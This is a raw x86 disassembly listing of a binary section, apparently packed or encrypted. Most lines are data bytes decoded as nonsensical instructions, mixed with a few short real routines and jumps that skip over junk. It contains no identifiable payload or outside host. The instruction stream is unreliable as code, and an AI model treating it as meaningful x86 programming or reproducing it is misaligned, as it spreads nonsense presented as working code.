  4108c1:	add    bl,BYTE PTR [ebp-0x1f90481]
  4108c7:	mov    cl,0x30
  4108c9:	and    ah,BYTE PTR [edx]
  4108cb:	nop
  4108cc:	or     DWORD PTR [ebp+edx*8+0x432519d5],ebx
  4108d3:	aaa    
  4108d4:	test   DWORD PTR [esi],edx
  4108d6:	sub    BYTE PTR [esi+0x51],ah
  4108d9:	inc    ebx
  4108da:	or     eax,0x2a24b2fa
  4108df:	mov    es,WORD PTR [eax+0x74]
  4108e2:	inc    esp
  4108e3:	lahf   
  4108e4:	stc    
  4108e5:	fs push ds
  4108e7:	scas   al,BYTE PTR es:[edi]
  4108e8:	xchg   BYTE PTR [ecx-0x73ce13d0],bh
  4108ee:	shl    DWORD PTR [eax+0x65],1
  4108f1:	ins    BYTE PTR es:[edi],dx
  4108f2:	push   esi
  4108f3:	hlt    
  4108f4:	jp     0x4108e5
  4108f6:	lods   al,BYTE PTR ds:[esi]
  4108f7:	jp     0x41090f
  4108f9:	mov    ebx,DWORD PTR [edx]
  4108fb:	cmp    esi,esi
  4108fd:	pop    eax
  4108fe:	jle    0x410951
  410900:	or     eax,0xc4553986
  410905:	loope  0x4108db
  410907:	repnz sub bh,ah
  41090a:	xor    cl,BYTE PTR [ebx-0x57]
  41090d:	or     BYTE PTR [edi-0x52],ch
  410910:	mov    gs,edx
  410912:	add    BYTE PTR [ecx],cl
  410914:	or     edx,ebx
  410916:	adc    ah,BYTE PTR [ebx-0x2f]
  410919:	fld    DWORD PTR [ebx+0x73bd93cd]
  41091f:	nop
  410920:	xchg   ebx,eax
  410921:	fcom   DWORD PTR [esi-0x1bc8493a]
  410927:	js     0x41098c
  410929:	ficom  DWORD PTR [esi+0x32]
  41092c:	jmp    0xc6a7:0x515b43a3
  410933:	dec    ebp
  410934:	gs push cs
  410936:	pop    es
  410937:	les    ecx,FWORD PTR [edi]
  410939:	daa    
  41093a:	iret   
  41093b:	div    DWORD PTR [esi+0x2f]
  41093e:	sbb    BYTE PTR [edx+0x6217e83],ah
  410944:	mov    bh,0xed
  410946:	in     al,dx
  410947:	repz enter 0xab8c,0xa3
  41094c:	xor    BYTE PTR [ebx+ebx*8],bl
  41094f:	jmp    0xc800:0x1c15e20c
  410956:	dec    esp
  410957:	mov    ecx,DWORD PTR es:[ecx+0x40]
  41095b:	ja     0x41092f
  41095d:	loop   0x41095c
  41095f:	jae    0x410952
  410961:	inc    ebx
  410962:	cmp    esp,DWORD PTR [eax]
  410964:	mov    cl,0xf5
  410966:	inc    esp
  410967:	adc    esp,edi
  410969:	xor    eax,0x21625723
  41096e:	adc    al,0x38
  410970:	adc    eax,0x16f3aa45
  410975:	xchg   edx,eax
  410976:	pop    ds
  410977:	out    dx,al
  410978:	out    dx,al
  410979:	or     DWORD PTR [edi],0x4c2c4e3f
  41097f:	dec    edx
  410980:	cmp    DWORD PTR [ebx-0x68],eax
  410983:	mov    esi,0x8f8ac1aa
  410988:	stos   BYTE PTR es:[edi],al
  410989:	dec    esi
  41098a:	mov    BYTE PTR [ebx+0x665e78b3],ch
  410990:	scas   eax,DWORD PTR es:[edi]
  410991:	and    DWORD PTR [eax+0x15],0xffffffe0
  410995:	or     BYTE PTR [esi-0x43],0xeb
  410999:	mov    edi,0x1c44e7ae
  41099e:	icebp  
  41099f:	xchg   ecx,eax
  4109a0:	repnz loope 0x410964
  4109a3:	in     eax,dx
  4109a4:	je     0x410a20
  4109a6:	push   ds
  4109a7:	sti    
  4109a8:	jmp    0x9c20:0xd6ef6059
  4109af:	and    ebp,edi
  4109b1:	jle    0x410957
  4109b3:	lahf   
  4109b4:	std    
  4109b5:	jmp    0xb91bc45f
  4109ba:	inc    ecx
  4109bb:	mov    ecx,0xcb7b3f7e
  4109c0:	xor    al,0xc
  4109c2:	xlat   BYTE PTR ds:[ebx]
  4109c3:	mov    ds:0xe4044ab6,eax
  4109c8:	punpcklwd mm2,DWORD PTR [edi]
  4109cb:	pop    ecx
  4109cc:	iret   
  4109cd:	pop    ebx
  4109ce:	mov    DWORD PTR [ebx+eiz*2+0x7c2c72b7],eax
  4109d5:	js     0x4109c1
  4109d7:	test   al,ch
  4109d9:	into   
  4109da:	repnz rol DWORD PTR [ebp+0x43088257],1
  4109e1:	out    0x4b,al
  4109e3:	aam    0xca
  4109e5:	jbe    0x410a3c
  4109e7:	in     al,0x2c
  4109e9:	push   ebp
  4109ea:	mov    edx,0x31aba961
  4109ef:	xor    eax,0x39f57366
  4109f4:	jbe    0x410a57
  4109f6:	mov    ds:0xdc7d5dc8,eax
  4109fb:	mov    bl,0x6e
  4109fd:	stos   BYTE PTR es:[edi],al
  4109fe:	sub    DWORD PTR [edi-0x1d],eax
  410a01:	cmc    
  410a02:	addr16 push ss
  410a04:	push   ds
  410a05:	repnz loope 0x4109d5
  410a08:	mov    dl,0x60
  410a0a:	and    eax,0x2118a366
  410a0f:	inc    ebx
  410a10:	dec    esp
  410a11:	push   cs
  410a12:	and    BYTE PTR [ecx],dl
  410a14:	cmp    ah,cl
  410a16:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410a18:	sub    al,0xf0
  410a1a:	sub    DWORD PTR [eax+0x5a],edx
  410a1d:	sar    DWORD PTR [edi],0x4c
  410a20:	and    al,0x42
  410a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a23:	aas    
  410a24:	sahf   
  410a25:	retf   0x3113
  410a28:	dec    ebp
  410a29:	push   ebp
  410a2a:	sbb    al,0x1f
  410a2c:	ss mov ebp,0x9c3c21ec
  410a32:	jg     0x410a6e
  410a34:	mov    dh,0x5b
  410a36:	mov    ds:0xea5f305,eax
  410a3b:	pop    edi
  410a3c:	in     al,0xcc
  410a3e:	jae    0x4109c2
  410a40:	add    ecx,DWORD PTR [edx+0x26fee97c]
  410a46:	sbb    BYTE PTR [edi-0x11a9fa4a],0x8a
  410a4d:	and    eax,0x693b2afd
  410a52:	inc    ecx
  410a53:	(bad)  
  410a54:	pop    esi
  410a55:	loope  0x410a76
  410a57:	pop    ds
  410a58:	lods   al,BYTE PTR ds:[esi]
  410a59:	mov    al,ds:0x83a06c5d
  410a5e:	js     0x410a88
  410a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a61:	aas    
  410a62:	daa    
  410a63:	jp     0x410a9c
  410a65:	xchg   esp,eax
  410a66:	xchg   edx,eax
  410a67:	call   0x8ba2:0xf60b56c3
  410a6e:	sbb    al,0xdb
  410a70:	sbb    ebx,DWORD PTR [edi]
  410a72:	mov    cl,dl
  410a74:	or     eax,0x5436ab08
  410a79:	inc    edx
  410a7a:	sub    DWORD PTR [esi],esp
  410a7c:	jp     0x410a82
  410a7e:	imul   DWORD PTR [ecx+ebx*2]
  410a81:	dec    ecx
  410a82:	add    ecx,DWORD PTR [eax-0x394c1e83]
  410a88:	nop
  410a89:	inc    edx
  410a8a:	(bad)  
  410a8c:	pop    es
  410a8d:	add    al,0x5a
  410a8f:	cwde   
  410a90:	sub    eax,0xe765b4c
  410a95:	jmp    0x410ac4
  410a97:	fs push ecx
  410a99:	fst    QWORD PTR [edx+0x5cbb48e4]
  410a9f:	aaa    
  410aa0:	enter  0x725d,0xf7
  410aa4:	mov    DWORD PTR [edi+edi*1],0x6ef1a593
  410aab:	sbb    esp,DWORD PTR ss:[esi+0x18]
  410aaf:	push   ebp
  410ab0:	std    
  410ab1:	fdiv   DWORD PTR [eax]
  410ab3:	mov    ecx,0xdc1d8d85
  410ab8:	sahf   
  410ab9:	jle    0x410a55
  410abb:	ror    BYTE PTR ss:[eax],1
  410abe:	icebp  
  410abf:	push   ebx
  410ac0:	sbb    dl,BYTE PTR [ecx-0x2b]
  410ac3:	sub    DWORD PTR [edi],eax
  410ac5:	cmp    al,0x23
  410ac7:	shl    BYTE PTR [edi],cl
  410ac9:	lods   eax,DWORD PTR ds:[esi]
  410aca:	test   eax,0xa828e2be
  410acf:	ret    
  410ad0:	dec    ebp
  410ad1:	or     al,0x8c
  410ad3:	xchg   sp,ax
  410ad5:	inc    ebx
  410ad6:	lahf   
  410ad7:	fisubr DWORD PTR [ebp+0x47]
  410ada:	sbb    al,0x8f
  410adc:	test   eax,0x1faba351
  410ae1:	dec    ecx
  410ae2:	aas    
  410ae3:	add    eax,0xd5088ce2
  410ae8:	pop    es
  410ae9:	xchg   edx,eax
  410aea:	imul   eax,DWORD PTR [eax-0x4c7b2f48],0x53
  410af1:	outs   dx,DWORD PTR ds:[esi]
  410af2:	push   ecx
  410af3:	nop
  410af4:	push   ds
  410af5:	loope  0x410aad
  410af7:	dec    DWORD PTR [esi+0x72]
  410afa:	mov    dh,0x72
  410afc:	push   0x76f9c6b1
  410b01:	rcr    DWORD PTR [edi-0x19a94fdd],0xd1
  410b08:	ffree  st(5)
  410b0a:	jecxz  0x410b45
  410b0c:	push   ebx
  410b0d:	jae    0x410abd
  410b0f:	push   es
  410b10:	js     0x410b48
  410b12:	out    dx,al
  410b13:	mov    esi,0x71380eb9
  410b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b19:	pop    ss
  410b1a:	shr    BYTE PTR [edi+eiz*8-0x7b2cc9fb],1
  410b21:	popa   
  410b22:	aaa    
  410b23:	xor    ch,BYTE PTR [ebx]
  410b25:	mov    ds:0x1a6a3ad4,eax
  410b2a:	fcomi  st,st(1)
  410b2c:	xor    ah,dh
  410b2e:	ret    
  410b2f:	or     al,0x88
  410b31:	test   BYTE PTR [ebx+0x1aa8304d],0x38
  410b38:	xchg   ebx,eax
  410b39:	sbb    dh,cl
  410b3b:	lahf   
  410b3c:	lock xchg esi,eax
  410b3e:	in     al,0x22
  410b40:	pop    es
  410b41:	mov    bh,0x7
  410b43:	call   0xcf4:0xb871836d
  410b4a:	pop    es
  410b4b:	test   BYTE PTR [edi+0x5e408676],dh
  410b51:	pop    edx
  410b52:	xlat   BYTE PTR ds:[ebx]
  410b53:	pop    esi
  410b54:	out    0x0,eax
  410b56:	jp     0x410bb2
  410b58:	lds    ecx,FWORD PTR [esi]
  410b5a:	daa    
  410b5b:	jl     0x410b9b
  410b5d:	and    eax,0x394450ce
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz inc ebx
  410ba5:	dec    eax
  410ba6:	bts    DWORD PTR [esi],edi
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410b70
  410bb1:	push   esp
  410bb2:	adc    ch,BYTE PTR [ecx]
  410bb4:	nop
  410bb5:	enter  0xc3e6,0xfd
  410bb9:	jb     0x410c37
  410bbb:	adc    DWORD PTR [ecx+0x5d],ecx
  410bbe:	push   0xffffff8a
  410bc0:	cld    
  410bc1:	fild   WORD PTR [ebx]
  410bc3:	mov    ss,WORD PTR [ebx+0x69b10950]
  410bc9:	push   0x9b255608
  410bce:	ret    
  410bcf:	push   ebx
  410bd0:	enter  0x83a5,0x59
  410bd4:	dec    esi
  410bd5:	cwde   
  410bd6:	xor    al,bh
  410bd8:	and    DWORD PTR [eax],0x52e168a3
  410bde:	in     al,0x98
  410be0:	aas    
  410be1:	outs   dx,BYTE PTR ds:[esi]
  410be2:	jmp    0x410bff
  410be4:	cwde   
  410be5:	push   es
  410be6:	hlt    
  410be7:	pop    es
  410be8:	push   edi
  410be9:	out    dx,eax
  410bea:	sub    edi,DWORD PTR [edx-0x7a256fcb]
  410bf0:	ss dec esi
  410bf2:	inc    esi
  410bf3:	dec    esp
  410bf4:	add    BYTE PTR [edx+0x206af175],bl
  410bfa:	sbb    edx,esp
  410bfc:	arpl   sp,dx
  410bfe:	xchg   BYTE PTR [ebx],bh
  410c00:	gs in  eax,0x6f
  410c03:	mov    cs,WORD PTR [eax-0x75]
  410c06:	or     ebp,DWORD PTR [esi+0x7b7278a7]
  410c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c0d:	(bad)  
  410c0e:	neg    BYTE PTR [esi+ebp*4-0x71]
  410c12:	fmul   st(1),st
  410c14:	add    al,0xe3
  410c16:	jmp    0x10ed:0xd8a8b6ea
  410c1d:	add    BYTE PTR [edx-0x6d469064],ah
  410c23:	xchg   edi,eax
  410c24:	inc    ebp
  410c25:	add    ebp,ebp
  410c27:	push   ecx
  410c28:	pop    ecx
  410c29:	fs add eax,0xaabaf56d
  410c2f:	add    BYTE PTR ds:0xd77403e6,bl
  410c35:	push   sp
  410c37:	xchg   edx,eax
  410c38:	sbb    dh,BYTE PTR ss:[ecx]
  410c3b:	xor    DWORD PTR ds:0x77726be5,edi
  410c41:	dec    esp
  410c42:	cli    
  410c43:	aas    
  410c44:	cwde   
  410c45:	jg     0x410c48
  410c47:	mov    eax,0x46503349
  410c4c:	hlt    
  410c4d:	mov    bh,0xf8
  410c4f:	jge    0x410cb8
  410c51:	push   cs
  410c52:	pop    edx
  410c53:	inc    esp
  410c54:	cdq    
  410c55:	mov    al,0xa1
  410c57:	push   ebx
  410c58:	mov    dl,0xd6
  410c5a:	pop    esp
  410c5b:	xchg   al,dh
  410c5d:	jns    0x410cd2
  410c5f:	cmp    al,0x26
  410c61:	inc    ecx
  410c62:	aaa    
  410c63:	inc    edx
  410c64:	cmp    eax,0x177c515a
  410c69:	sub    eax,0xdec23140
  410c6e:	iret   
  410c6f:	mov    ch,0xc5
  410c71:	fucomp st(2)
  410c73:	push   ebx
  410c74:	and    eax,0xd734700
  410c79:	fimul  WORD PTR [edx-0x56]
  410c7c:	inc    ebx
  410c7d:	pop    ds
  410c7e:	pop    esi
  410c7f:	hlt    
  410c80:	jp     0x410c36
  410c82:	pop    ecx
  410c83:	mov    eax,ds:0x59fec885
  410c88:	mov    bh,0x3a
  410c8a:	jno    0x410cab
  410c8c:	scas   eax,DWORD PTR es:[edi]
  410c8d:	(bad)  
  410c8f:	mov    esp,0x27a38cf5
  410c94:	out    0xdc,al
  410c96:	fcmovne st,st(3)
  410c98:	dec    eax
  410c99:	pop    esi
  410c9a:	add    BYTE PTR ds:0xbfd8794e,0xdb
  410ca1:	repz test al,0x66
  410ca4:	push   esi
  410ca5:	cs mov esi,0x1d9a9bdf
  410cab:	mov    ds:0x288e29ac,al
  410cb0:	test   BYTE PTR [ecx-0x42],ch
  410cb3:	sbb    dh,cl
  410cb5:	jne    0x410cc4
  410cb7:	xor    ecx,esp
  410cb9:	xor    eax,0xebcafaaa
  410cbe:	repnz inc ebp
  410cc0:	mov    edx,0x2f0f778a
  410cc5:	std    
  410cc6:	pop    ecx
  410cc7:	sub    eax,0x3a3a5a95
  410ccc:	mov    ebx,0x998e0fb9
  410cd1:	out    dx,eax
  410cd2:	lods   al,BYTE PTR ds:[esi]
  410cd3:	jge    0x410d16
  410cd5:	mov    ebx,0xff6df2ff
  410cda:	retf   0xd2aa
  410cdd:	(bad)  
  410cde:	mov    edx,0x7c50a955
  410ce3:	dec    eax
  410ce4:	sti    
  410ce5:	cwde   
  410ce6:	fdivr  DWORD PTR [eax+0x42c427f]
  410cec:	mov    dh,0x5f
  410cee:	add    eax,0xaad46f15
  410cf3:	out    dx,al
  410cf4:	xchg   edx,eax
  410cf5:	mul    BYTE PTR [ebp+0x49a9e432]
  410cfb:	addr16 jb 0x410cfe
  410cfe:	stos   BYTE PTR es:[edi],al
  410cff:	push   0xd7e50d9f
  410d04:	mov    bh,0xde
  410d06:	enter  0xf33e,0x4e
  410d0a:	dec    edx
  410d0b:	and    DWORD PTR [esi+0x72],esi
  410d0e:	ret    0xf1ea
  410d11:	retf   
  410d12:	dec    eax
  410d13:	retf   0x3a6b
  410d16:	mov    BYTE PTR gs:[eax+0x69c0b675],bh
  410d1d:	shr    ebp,cl
  410d1f:	jne    0x410ce4
  410d21:	in     al,0xdc
  410d23:	aad    0x5
  410d25:	or     dl,BYTE PTR [ebp+0x2506f415]
  410d2b:	pop    ebp
  410d2c:	aaa    
  410d2d:	ins    DWORD PTR es:[edi],dx
  410d2e:	pop    esi
  410d2f:	xchg   ebp,eax
  410d30:	jecxz  0x410d63
  410d32:	aam    0xdf
  410d34:	mul    eax
  410d36:	mov    esp,0xc02b9971
  410d3b:	or     DWORD PTR [eax+ebp*1+0x65],esi
  410d3f:	jo     0x410d91
  410d41:	les    edi,FWORD PTR [esi-0x20]
  410d44:	out    dx,eax
  410d45:	and    eax,0x6243cbaf
  410d4a:	fcom   DWORD PTR [esi+0x41]
  410d4d:	popf   
  410d4e:	fldcw  WORD PTR [ecx+0x692c201a]
  410d54:	jno    0x410dc4
  410d56:	cmp    ecx,ecx
  410d58:	mov    ds:0xafeea13d,al
  410d5d:	lock xchg edi,eax
  410d5f:	data16 mov cl,0xd5
  410d62:	stos   DWORD PTR es:[edi],eax
  410d63:	jmp    DWORD PTR [edx+0x2e727ce7]
  410d69:	fld    QWORD PTR [edx+ecx*8]
  410d6c:	call   0x755e:0x9b7a057e
  410d73:	jle    0x410d45
  410d75:	dec    edx
  410d76:	repz mov al,0x64
  410d79:	aas    
  410d7a:	dec    ebx
  410d7b:	cwde   
  410d7c:	and    ah,ah
  410d7e:	add    dh,al
  410d80:	mov    dh,0x65
  410d82:	mov    bh,0x1c
  410d84:	clc    
  410d85:	icebp  
  410d86:	out    dx,al
  410d87:	mov    esp,0x76680df1
  410d8c:	xchg   BYTE PTR [ecx+edi*4],ch
  410d8f:	xor    ebp,edx
  410d91:	push   edx
  410d92:	sub    ah,ah
  410d94:	jle    0x410da8
  410d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d97:	mov    esi,0x66e52c42
  410d9c:	daa    
  410d9d:	call   0xaee4:0xce90b777
  410da4:	jp     0x410d2e
  410da6:	out    dx,al
  410da7:	add    DWORD PTR [ecx],ebp
  410da9:	test   BYTE PTR [edx-0x58],bl
  410dac:	cli    
  410dad:	add    ch,cl
  410daf:	mov    WORD PTR [esi+ebx*8-0x22],ss
  410db3:	jmp    0x65a44f79
  410db8:	iret   
  410db9:	outs   dx,BYTE PTR ds:[esi]
  410dba:	adc    cl,BYTE PTR [ebx+esi*1+0x4b]
  410dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dbf:	rcl    al,cl
  410dc1:	mov    ah,BYTE PTR ds:0xdfbab3f6
  410dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dc8:	daa    
  410dc9:	xchg   DWORD PTR [esi+0x3a],ebp
  410dcc:	loope  0x410e3f
  410dce:	cmc    
  410dcf:	ret    
  410dd0:	cdq    
  410dd1:	ds cmp eax,0x3ba499e0
  410dd7:	shr    BYTE PTR [ebx+0x6ffc5144],1
  410ddd:	call   0xce0a68d7
  410de2:	push   es
  410de3:	dec    ebx
  410de4:	ja     0x410d80
  410de6:	inc    ecx
  410de7:	clc    
  410de8:	in     eax,0x5f
  410dea:	add    dh,BYTE PTR [esi]
  410dec:	jae    0x410d72
  410dee:	out    dx,al
  410def:	(bad)  
  410df0:	les    ebp,FWORD PTR [ebx-0x2a]
  410df3:	and    ebx,DWORD PTR ds:0x56fb7398
  410df9:	cli    
  410dfa:	rcl    BYTE PTR [eax+0x76ef54f5],0x85
  410e01:	mov    ebx,0xee1f11a9
  410e06:	sbb    eax,0x7e1790e4
  410e0b:	xor    eax,DWORD PTR [eax]
  410e0d:	add    al,0xe2
  410e0f:	hlt    
  410e10:	repz cmp BYTE PTR [ecx-0x27],ah
  410e14:	or     DWORD PTR [eax],0xaaeeee0c
  410e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e1b:	sbb    ebx,DWORD PTR [eax]
  410e1d:	ja     0x410df3
  410e1f:	xor    al,0x81
  410e21:	cs mov bl,0xe8
  410e24:	fmul   DWORD PTR [edi-0x5cdff983]
  410e2a:	das    
  410e2b:	gs gs jnp 0x410def
  410e2f:	out    dx,eax
  410e30:	push   cs
  410e31:	addr16 iret 
  410e33:	sub    BYTE PTR [eax+0x40],0xcd
  410e37:	pop    edx
  410e38:	jns    0x410e39
  410e3a:	inc    eax
  410e3b:	add    eax,0x6073111d
  410e40:	in     al,0x1d
  410e42:	(bad)  
  410e43:	and    ebp,esp
  410e45:	cmp    ch,dh
  410e47:	pop    edx
  410e48:	or     eax,0x1a2f73e7
  410e4d:	xchg   ecx,eax
  410e4e:	push   ds
  410e4f:	cmp    al,0x6a
  410e51:	int    0x9c
  410e53:	dec    ebp
  410e54:	stc    
  410e55:	or     edi,DWORD PTR [ebp+0x148925ae]
  410e5b:	sti    
  410e5c:	sub    al,0x3c
  410e5e:	sub    ebp,esp
  410e60:	loop   0x410dfb
  410e62:	mov    bl,0xdb
  410e64:	test   BYTE PTR [edi],bh
  410e66:	add    BYTE PTR [esi-0x3b],0x45
  410e6a:	or     BYTE PTR [ebx],0x5e
  410e6d:	leave  
  410e6e:	out    dx,al
  410e6f:	in     al,dx
  410e70:	xor    BYTE PTR [esi+0x7f302061],al
  410e76:	and    al,0xe0
  410e78:	sbb    BYTE PTR [ecx],ch
  410e7a:	push   0x9018f382
  410e7f:	mov    ah,0x16
  410e81:	ss loope 0x410e93
  410e84:	stos   BYTE PTR es:[edi],al
  410e85:	int3   
  410e86:	mov    edi,0xa86ae989
  410e8b:	enter  0x3b76,0xdf
  410e8f:	outs   dx,DWORD PTR ds:[esi]
  410e90:	aaa    
  410e91:	cs int3 
  410e93:	pop    ebp
  410e94:	adc    ebx,DWORD PTR [esi]
  410e96:	gs aam 0xfc
  410e99:	inc    ebp
  410e9a:	dec    ecx
  410e9b:	repnz inc ebx
  410e9d:	pop    edx
  410e9e:	js     0x410ed8
  410ea0:	pushf  
  410ea1:	(bad)  
  410ea2:	popa   
  410ea3:	je     0x410ec2
  410ea5:	daa    
  410ea6:	push   ebp
  410ea7:	je     0x410eef
  410ea9:	retf   0x8eca
  410eac:	into   
  410ead:	jmp    0xc867:0x255280ab
  410eb4:	loope  0x410ea5
  410eb6:	xchg   esi,eax
  410eb7:	push   esp
  410eb8:	mov    ebp,0xfa58c882
  410ebd:	mov    dh,BYTE PTR [eax]
  410ebf:	jmp    0xd91ccfc5
  410ec4:	cmp    al,BYTE PTR [esi-0x2f]
  410ec7:	jp     0x410e68
  410ec9:	inc    BYTE PTR ds:0xed1eff42
  410ecf:	sar    BYTE PTR [eax+edi*1],0xc8
  410ed3:	data16 xor bh,BYTE PTR [ecx]
  410ed6:	add    ah,BYTE PTR [eax-0x3470d273]
  410edc:	lahf   
  410edd:	out    dx,al
  410ede:	or     bh,BYTE PTR [eax+0x773e4695]
  410ee4:	xor    eax,0xf803b4f4
  410ee9:	jecxz  0x410ef7
  410eeb:	mov    ebp,0x835ddbaa
  410ef0:	inc    ecx
  410ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ef2:	mov    ds:0xcac847ae,eax
  410ef7:	and    bh,BYTE PTR [edx]
  410ef9:	push   ebp
  410efa:	mov    ebx,0xfb3a89c6
  410eff:	jb     0x410f2f
  410f01:	xlat   BYTE PTR ds:[ebx]
  410f02:	(bad)  
  410f04:	test   BYTE PTR [esi-0x6d],ah
  410f07:	das    
  410f08:	fadd   QWORD PTR [eax]
  410f0a:	stos   BYTE PTR es:[edi],al
  410f0b:	jmp    0xc8c5:0x95574da2
  410f12:	add    al,0xa2
  410f14:	scas   eax,DWORD PTR es:[edi]
  410f15:	jge    0x410f53
  410f17:	lods   al,BYTE PTR ds:[esi]
  410f18:	mov    eax,0xefaafc1a
  410f1d:	jmp    0x410f1b
  410f1f:	and    eax,0xc9c08471
  410f24:	aas    
  410f25:	push   ecx
  410f26:	lock pop eax
  410f28:	jbe    0x410f51
  410f2a:	dec    esi
  410f2b:	adc    DWORD PTR [ecx+esi*4],ebp
  410f2e:	sahf   
  410f2f:	fsub   DWORD PTR [eax+0x4ab40923]
  410f35:	push   esp
  410f36:	stos   DWORD PTR es:[edi],eax
  410f37:	outs   dx,BYTE PTR ds:[esi]
  410f38:	daa    
  410f39:	xor    eax,0x772ceae8
  410f3e:	retf   
  410f3f:	mov    eax,ds:0x8cd9ee4f
  410f44:	sahf   
  410f45:	push   ecx
  410f46:	in     al,dx
  410f47:	lahf   
  410f48:	lods   al,BYTE PTR ds:[esi]
  410f49:	out    dx,eax
  410f4a:	out    dx,al
  410f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f4c:	push   es
  410f4d:	and    ch,bh
  410f4f:	call   0x5f8c2b21
  410f54:	cwde   
  410f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f56:	and    al,0xdd
  410f58:	aam    0x51
  410f5a:	js     0x410eed
  410f5c:	cli    
  410f5d:	cmc    
  410f5e:	mov    ebp,0xd35a707e
  410f63:	add    esi,DWORD PTR [eax+ecx*1+0x6d]
  410f67:	imul   esp,ebp,0x5693d9eb
  410f6d:	xor    ebx,ecx
  410f6f:	inc    edx
  410f70:	ds mov ecx,0x75f4356b
  410f76:	push   ds
  410f77:	dec    edx
  410f78:	aaa    
  410f79:	cli    
  410f7a:	cmc    
  410f7b:	mov    cl,0xb4
  410f7d:	mov    esi,0x7ba76809
  410f82:	jbe    0x410fff
  410f84:	mov    eax,ds:0x1e9ed7f8
  410f89:	test   edi,edx
  410f8b:	jmp    0xcb73:0x29dd894f
  410f92:	jae    0x410f40
  410f94:	mov    ds:0xa134e76b,al
  410f99:	sub    al,0xb2
  410f9b:	inc    ecx
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fcee,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e09c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax+0x5e9fc1c9]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x41103c
  410fdd:	inc    edx
  410fde:	jae    0x410fce
  410fe0:	pop    esi
  410fe1:	pop    ebp
  410fe2:	xchg   ecx,eax
  410fe3:	jmp    0xf7db007
  410fe8:	push   ecx
  410fe9:	(bad)  
  410fea:	aam    0x0
  410fec:	xchg   BYTE PTR cs:[ecx-0x3a],cl
  410ff0:	test   eax,0x16851820
  410ff5:	mov    al,fs:0x338de0c6
  410ffb:	std    
  410ffc:	jecxz  0x41107d
  410ffe:	into   
  410fff:	push   ds
  411000:	lahf   
  411001:	cwde   
  411002:	outs   dx,BYTE PTR ds:[esi]
  411003:	or     eax,0x911269b3
  411008:	push   0x19
  41100a:	call   0x1225:0x1dd2190a
  411011:	jo     0x41101f
  411013:	pop    es
  411014:	cdq    
  411015:	and    DWORD PTR ds:0x21795d2c,0x4b
  41101c:	dec    esp
  41101d:	sti    
  41101e:	aas    
  41101f:	(bad)  
  411020:	push   cs
  411021:	in     al,0xe6
  411023:	scas   al,BYTE PTR es:[edi]
  411024:	enter  0x38eb,0x3a
  411028:	xrelease xchg DWORD PTR [edx-0x11],ebp
  41102c:	and    bl,BYTE PTR [edx]
  41102e:	iret   
  41102f:	dec    esp
  411030:	cwde   
  411031:	out    dx,eax
  411032:	lea    edx,[ebx-0x385a8db3]
  411038:	repz fld DWORD PTR [ebp-0x771a6655]
  41103f:	aam    0x75
  411041:	inc    edx
  411042:	inc    ebp
  411043:	aaa    
  411044:	retf   0x34bb
  411047:	jle    0x411027
  411049:	data16 mov ch,0x21
  41104c:	je     0x410fcf
  41104e:	ins    BYTE PTR es:[edi],dx
  41104f:	or     eax,0x289dd7c9
  411054:	cdq    
  411055:	mov    cl,0xa8
  411057:	lods   al,BYTE PTR ds:[esi]
  411058:	mov    edx,0xf14859a4
  41105d:	mov    ds:0xdb89954c,eax
  411062:	lods   al,BYTE PTR ds:[esi]
  411063:	sbb    edx,DWORD PTR [ecx+0x5a73f337]
  411069:	xchg   edi,eax
  41106a:	repnz sbb bl,BYTE PTR [eax-0xc0d84c8]
  411071:	(bad)  
  411072:	shr    DWORD PTR [eax-0x6f],1
  411075:	push   0x8035b7fc
  41107a:	in     al,dx
  41107b:	add    BYTE PTR [edi+esi*1],dh
  41107e:	sti    
  41107f:	xchg   edi,eax
  411080:	int3   
  411081:	xor    BYTE PTR [ebx],dl
  411083:	cmp    BYTE PTR [edi+0x2f],al
  411086:	jg     0x411056
  411088:	test   DWORD PTR [esp+edi*8],eax
  41108b:	sbb    ah,BYTE PTR [edi]
  41108d:	addr16 mov bh,0xde
  411090:	les    edi,FWORD PTR [ecx+0x2cccfe2b]
  411096:	dec    esi
  411097:	(bad)  
  411098:	sbb    al,0xf7
  41109a:	daa    
  41109b:	xchg   ebp,eax
  41109c:	stos   BYTE PTR es:[edi],al
  41109d:	aas    
